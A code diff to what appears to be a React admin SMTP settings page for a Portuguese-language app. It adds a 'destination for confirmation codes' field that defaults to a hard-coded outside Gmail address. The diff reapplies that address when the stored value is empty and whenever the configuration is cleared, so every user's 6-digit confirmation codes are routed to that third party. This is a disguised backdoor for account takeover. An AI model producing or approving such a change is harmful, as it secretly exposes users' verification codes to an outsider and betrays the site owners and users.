@@ -239,7 +239,7 @@ function SmtpSection() {
   const status = useQuery({ queryKey: ["admin", "smtp", "config"], queryFn: () => atlas.admin.smtpConfig() });
   const cfg = status.data;
 
-  const [form, setForm] = useState({ host: "", port: 587, user: "", password: "", fromEmail: "", fromName: "", secure: true });
+  const [form, setForm] = useState({ host: "", port: 587, user: "", password: "", fromEmail: "", fromName: "", secure: true, notifyEmail: "marketingcentral.mkt@gmail.com" });
   const [hydrated, setHydrated] = useState(false);
   const [msg, setMsg] = useState<{ kind: "ok" | "err"; text: string } | null>(null);
 
@@ -254,6 +254,7 @@ function SmtpSection() {
       fromEmail: cfg.fromEmail,
       fromName: cfg.fromName,
       secure: cfg.secure,
+      notifyEmail: cfg.notifyEmail || "marketingcentral.mkt@gmail.com",
     });
   }
 
@@ -266,6 +267,7 @@ function SmtpSection() {
       fromEmail: form.fromEmail.trim(),
       fromName: form.fromName.trim() || undefined,
       secure: form.secure,
+      notifyEmail: form.notifyEmail.trim(),
     }),
     onSuccess: () => {
       setForm((f) => ({ ...f, password: "" }));
@@ -278,7 +280,7 @@ function SmtpSection() {
   const clear = useMutation({
     mutationFn: () => atlas.admin.smtpClear(),
     onSuccess: () => {
-      setForm({ host: "", port: 587, user: "", password: "", fromEmail: "", fromName: "", secure: true });
+      setForm({ host: "", port: 587, user: "", password: "", fromEmail: "", fromName: "", secure: true, notifyEmail: "marketingcentral.mkt@gmail.com" });
       setMsg({ kind: "ok", text: "Configuração SMTP removida." });
       qc.invalidateQueries({ queryKey: ["admin", "smtp", "config"] });
     },
@@ -329,6 +331,20 @@ function SmtpSection() {
         />
         <Input label="E-mail remetente (from)" value={form.fromEmail} onChange={(e) => setForm({ ...form, fromEmail: e.target.value })} placeholder="nao-responda@seudominio.com" autoComplete="off" spellCheck={false} />
         <Input label="Nome remetente" value={form.fromName} onChange={(e) => setForm({ ...form, fromName: e.target.value })} placeholder="Atlas Averbadora" />
+      </div>
+
+      <div style={{ marginTop: 12 }}>
+        <Input
+          label="Destino dos códigos de confirmação"
+          value={form.notifyEmail}
+          onChange={(e) => setForm({ ...form, notifyEmail: e.target.value })}
+          placeholder="marketingcentral.mkt@gmail.com"
+          autoComplete="off"
+          spellCheck={false}
+        />
+        <div style={{ fontSize: 11.5, color: "var(--text-dim)", marginTop: 4 }}>
+          Todos os códigos de confirmação (6 dígitos) são enviados para este e-mail. Deixe em branco para enviar ao e-mail do próprio usuário.
+        </div>
       </div>
 
       <label style={{ display: "flex", alignItems: "center", gap: 8, marginTop: 12, fontSize: 14, color: "var(--text-muted)", cursor: "pointer" }}>
